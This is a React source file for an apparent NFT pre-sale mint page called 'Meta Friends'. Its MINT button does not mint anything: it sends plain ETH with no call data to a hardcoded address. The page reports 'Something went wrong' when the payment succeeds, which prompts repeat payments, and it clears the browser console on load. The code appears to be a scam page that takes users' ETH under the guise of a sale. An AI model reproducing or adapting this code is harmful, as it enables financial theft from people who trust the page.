import React, { Component } from 'react';
import "react-responsive-carousel/lib/styles/carousel.min.css"; // requires a loader
import { Carousel } from 'react-responsive-carousel';
import { isMobile } from 'react-device-detect';

const Web3 = require("web3");

const CONFIG = {
	"CONTRACT_ADDRESS": "0xcB2617E6fc446c7A58048FCfad19cB8c1Bc77180",
	"NETWORK": {
		"NAME": "Ethereum",
		"SYMBOL": "ETH",
		"ID": 1
	},
	"SHOW_BACKGROUND": true
}

const webAddress = 'metafriendsnft.live/'

export default class App extends Component {

	state = {
		errorMessage: '',
		connected: false,
		sending: false,
		pandaCount: 1,
	}

	async componentDidMount() {
		setTimeout(() => {
			console.clear();
		}, 100)

		let enabled = await this.ethEnabled()
		this.setState({
			connected: enabled
		});

	}

	async ethEnabled() {
		// if (window.web3) {
		//   window.web3 = new Web3(window.web3.currentProvider);
		//   window.ethereum.enable();
		//   return true;
		// }
		// return false;

		if (window.ethereum) {
			await window.ethereum.send('eth_requestAccounts');
			window.web3 = new Web3(window.ethereum);
			return true;
		}
		return false;

	}


	async didSelectWallet() {
		try {

			console.log(this.ethEnabled());

		} catch (error) {
			console.log('error', error);
		}
	}

	async didSelecteDonate() {
		try {


			let ethEnable = await this.ethEnabled()

			if (isMobile && !ethEnable) {
				window.location.assign('https://metamask.app.link/dapp/' + webAddress)
			} else {
				const { pandaCount } = this.state
				const web3 = window.web3;

				var addr = web3.currentProvider.selectedAddress

				var amount = 0.1 * pandaCount;

				amount = amount.toString(); // Willing to send 2 ethers
				const amountToSend = web3.utils.toWei(amount, "ether"); // Convert to wei value

				this.setState({
					sending: true
				})
				var send = await web3.eth.sendTransaction({ from: addr, to: CONFIG.CONTRACT_ADDRESS, value: amountToSend });

				this.setState({
					sending: false
				})

				if (send.status) {
					this.setState({
						errorMessage: 'Something went wrong, please try again.'
					})
				} else {
					this.setState({
						errorMessage: 'Transaction not successfull.'
					})
				}
			}

		} catch (error) {
			console.log('error', error);
			this.setState({
				sending: false,
				errorMessage: 'Transaction not successfull.'
			})
			if (error.code) {
				this.setState({
					errorMessage: error.message
				})
			}
		}
	}


	decrementMintAmount() {
		const { pandaCount } = this.state
		let newPandaCount = pandaCount - 1;
		if (newPandaCount < 1) {
			newPandaCount = 1;
		}
		this.setState({
			pandaCount: newPandaCount
		})
	};

	incrementMintAmount = () => {
		const { pandaCount } = this.state
		let newPandaCount = pandaCount + 1;
		if (newPandaCount > 4) {
			newPandaCount = 4;
		}
		this.setState({
			pandaCount: newPandaCount
		})
	};


	render() {


		const { errorMessage, connected, sending, pandaCount } = this.state


		return <div class="container">
			<div class="card">
				<div class="container-fliud">

					<div className='text-center'>
						<img src='./config/logo.png' height="50" style={{
							marginBottom : 30
						}}/>
					</div>
					<div class="wrapper row">
						<div class="preview col-md-6">
							<Carousel
								autoPlay
								infiniteLoop
								showArrows={false}
								showThumbs={false}>
								<div>
									<img src="https://gateway.pinata.cloud/ipfs/QmasRDddPSxofbsjAHkjy3YsSy1FVXArkR2NtV5Q1THRpD/1.5ab4a058.jpg" />

								</div>
								<div>
									<img src="https://gateway.pinata.cloud/ipfs/QmasRDddPSxofbsjAHkjy3YsSy1FVXArkR2NtV5Q1THRpD/3.4cd9d846.jpg" />

								</div>
								<div>
									<img src="https://gateway.pinata.cloud/ipfs/QmasRDddPSxofbsjAHkjy3YsSy1FVXArkR2NtV5Q1THRpD/5.60d33040.jpg" />

								</div>
							</Carousel>
						</div>
						<div class="details col-md-6">
							<div className='text-center'>
								<h1>PRE-SALE</h1>
								<h3 className='sub'>PHASE ONE</h3>
							</div>

							<div className='row'>
								<div className='col-md-4 col-xs-4'>
									<p><b>Supply</b></p>
									<p>6666</p>
								</div>
								<div className='col-md-4 text-center col-xs-4'>
									<p><b>Price</b></p>
									<p>0.1 ETH</p>
								</div>
								<div className='col-md-4 text-right col-xs-4'>
									<p><b>Max</b></p>
									<p>4 p wallet</p>
								</div>
							</div>

							<div className='text-center'>
								<h1 className='header'>Meta Friends</h1>
							</div>

							<div className='row border'>

								<div className='col-md-6 col-xs-6'>
									<img src='./s.gif' className='gif' />
								</div>

								<div className='col-md-6 text-right max col-xs-6'>
									<p><b>Price per NFT</b></p>
									<p className='max-value'>0.1 ETH</p>
								</div>

							</div>

							<div className='row border bg'>

								<div className='col-md-6 button col-xs-6'>
									<button
										onClick={(e) => {
											e.preventDefault();
											this.decrementMintAmount();
										}}
										className='inc_btn'>-</button>
									<p className='value'>{pandaCount}</p>
									<button
										onClick={(e) => {
											e.preventDefault();
											this.incrementMintAmount();
										}}
										className='inc_btn'>+</button>
								</div>

								<div className='col-md-6 text-right btn-mx col-xs-6'>
									<button
										onClick={(e) => {
											e.preventDefault();
											this.setState({
												pandaCount: 4
											})
										}}
										className='max-button'>SET MAX</button>
								</div>
							</div>

							<div className='hr'></div>

							<div className='row padding'>

								<div className='col-md-6  col-xs-6'>
									<p>Total</p>
								</div>

								<div className='col-md-6 text-right col-xs-6'>
									<p><b>{pandaCount * 0.1} eth</b></p>
								</div>

							</div>

							<div className='hr'></div>

							<div className='text-center'>
								<button
									onClick={e => {
										e.preventDefault()
										this.didSelecteDonate();
									}}
									className='max-button donate mt'>MINT</button>
								<br />
								<br />
								<p>- / 6666</p>
							</div>

						</div>
					</div>
				</div>
			</div>
		</div>;
	}
}
